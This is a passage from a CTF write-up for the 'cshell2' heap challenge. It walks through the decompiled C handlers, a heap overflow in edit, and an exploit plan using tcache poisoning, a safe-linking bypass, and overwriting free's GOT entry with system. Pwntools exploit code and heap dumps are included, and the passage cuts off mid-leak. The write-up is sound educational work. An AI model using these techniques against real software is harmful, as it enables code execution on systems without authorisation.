    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input lastname: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">lastName</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input age: &#34;</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">age</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input bio: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">bio</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v4</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>It creates a chunk by asking several fields but nothing actually interesting there. Let&rsquo;s take a look at the <code>show</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">show</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+7h] [rbp-9h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Enter index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%hhu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mh">0xEu</span> <span class="o">&amp;&amp;</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
    <span class="n">printf</span><span class="p">(</span>
      <span class="s">&#34;Name</span><span class="se">\n</span><span class="s"> last: %s first: %s middle: %s age: %d</span><span class="se">\n</span><span class="s">bio: %s&#34;</span><span class="p">,</span>
      <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">lastName</span><span class="p">,</span>
      <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">firstName</span><span class="p">,</span>
      <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">midName</span><span class="p">,</span>
      <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">age</span><span class="p">,</span>
      <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">bio</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invalid index&#34;</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>It prints a chunk only if it&rsquo;s allocated (size entry initialized in the size array) and if the index is right.
Then the <code>delete</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">delete</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+7h] [rbp-9h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%hhu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mh">0xEu</span> <span class="o">&amp;&amp;</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]);</span>
    <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Successfully Deleted!&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Either index error or trying to delete something you shouldn&#39;t be...&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Quite common <code>delete</code> handler, it prevents double free.
The vulnerability is in the <code>edit</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">edit</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+7h] [rbp-9h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%hhu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&lt;=</span> <span class="mh">0xEu</span> <span class="o">&amp;&amp;</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input firstname: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">],</span> <span class="mi">8uLL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input middlename: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">midName</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input lastname: &#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">lastName</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input age: &#34;</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">age</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Input bio: (max %d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">-</span> <span class="mi">32LL</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">bio</span><span class="p">,</span> <span class="n">size_array</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">-</span> <span class="mi">32LL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Successfully edit&#39;d!&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>It reads <code>size_array[2 * idx] - 32LL</code> bytes into a <code>0x100</code>-sized buffer which leads to a heap overflow.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="exploitation">
        Exploitation
        <a data-clipboard-text="https://nasm.re/posts/cshell2/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>There is no actual issue, we can allocate whatever chunk bigger than <code>0x407</code>, the only fancy thing we have to do would be to defeat safe-linking to get an arbitrary write with a tcache poisoning attack on the <code>0x410</code> tcache bin. Here is the attack I led against the challenge but that&rsquo;s not the most optimized.</p>
<p>The plan is to:</p>
<ul>
<li>Allocate two <code>0x408</code>-sized chunks : pivot and victim, in order to easily get later libc leak.</li>
<li>Allocate 9 more chunks and then fill the <code>0x410</code> tcachebin with them (with only 7 of them).</li>
<li>Delete <code>victim</code> and overflow pivot up to the next free pointer of <code>victim</code> to get a libc leak.</li>
<li>Allocate a <code>0x408</code>-sized chunk to get the <code>8</code>-th chunk (within <code>chunk_array</code>) which is on the top of the bin.</li>
<li>Leak the heap same way as for libc, but we have to defeat safe-linking.</li>
<li>Delete the <code>9</code>-th chunk to put it in the tcachebin at the first position.</li>
<li>Then we can simply <code>edit</code> chunk <code>8</code> and overflow over chunk <code>9</code> to poison its next <code>fp</code> to hiijack it toward the GOT entry of <code>free</code>.</li>
<li>Pop chunk <code>9</code> from the freelist and then request another the target memory area : the GOT entry of <code>free</code>.</li>
<li>Write <code>system</code> into the GOT entry of <code>free</code>.</li>
<li>Free whatever chunk for which <code>//bin/sh</code> is written at the right begin.</li>
<li>PROFIT.</li>
</ul>
<p>To understand the attack process I&rsquo;ll show the heap state at certain part of the attack.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="libc--heap-leak">
        Libc / heap leak
        <a data-clipboard-text="https://nasm.re/posts/cshell2/#libc--heap-leak" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Libc / heap leak" href="#libc--heap-leak">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>First we have to fill the tcache. We allocate a chunk right after <code>chunk0</code> we do not put into the tcache to be able to put it in the unsortedbin to make appear unsortedbin&rsquo;s address:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;//bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="c1"># pivot</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="c1"># victim</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">7</span><span class="o">+</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">7</span><span class="o">+</span><span class="mi">2</span><span class="p">):</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;Y&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">))</span>

<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Y&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1 Add</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x1c7cc0</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="c1"># Heap state:</span>
<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x1de1290	0x0000000000000000	0x0000000000000411	................ [chunk0]
</span><span class="s2">0x1de12a0	0x68732f6e69622f0a	0x0000000000000a0a	./bin/sh........
</span><span class="s2">0x1de12b0	0x000000000000000a	0x0000000000000539	........9.......
</span><span class="s2">0x1de12c0	0x0000000000000000	0x0000000000000000	................
</span><span class="s2">0x1de12d0	0x0000000000000000	0x0000000000000000	................
</span><span class="s2">0x1de12e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de12f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1300	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1310	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1320	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1330	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1340	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1350	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1360	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1370	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1380	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1390	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de13a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de13b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de13c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de13d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de13e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de13f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1400	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1410	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1420	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1430	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1440	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1450	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1460	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1470	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1480	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1490	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de14a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de14b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de14c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de14d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de14e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de14f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1500	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1510	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1520	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1530	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1540	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1550	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1560	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1570	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1580	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1590	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de15a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de15b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de15c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de15d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de15e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de15f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1600	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1610	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1620	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1630	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1640	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1650	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1660	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1670	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1680	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de1690	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span class="s2">0x1de16a0	0x5959595959595959	0x0a59595959595959	YYYYYYYYYYYYYYY.	 &lt;-- unsortedbin[all][0] [chunk1]
</span><span class="s2">0x1de16b0	0x00007f34f64c3cc0	0x00007f34f64c3cc0	.&lt;L.4....&lt;L.4...
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><p>Then let&rsquo;s get a heap leak, we request back from the tcache the 8-th chunk, we free the <code>9</code>-th chunk that is allocated right after the <code>8</code>-th to be able to leak its next free pointer same way as for the libc previously. Plus we have to defeat safe-linking. To understand the defeat of safe-linking I advice you to read <a
  class="gblog-markdown__link"
  href="https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation"
  
  >this</a
>. It ends up to the <code>decrypt_pointer</code> function that makes use of known parts of the encrypted <code>fp</code> to decrypt the whole pointer. I didn&rsquo;t code the function by myself, too lazy for that, code comes from the <a
  class="gblog-markdown__link"
  href="https://github.com/AeroCTF/aero-ctf-2022/blob/main/tasks/pwn/heap-2022/solution/sploit.py#L44"
  
  >AeroCTF heap-2022 writeup</a
>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">decrypt_pointer</span><span class="p">(</span><span class="n">leak</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
    <span class="n">parts</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">36</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">36</span><span class="p">)</span>
    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">36</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span>
    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">|</span> <span class="n">parts</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="n">add</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">))</span>

<span class="n">show</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">decrypt_pointer</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1 Add</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x1000</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="c1"># Heap state</span>

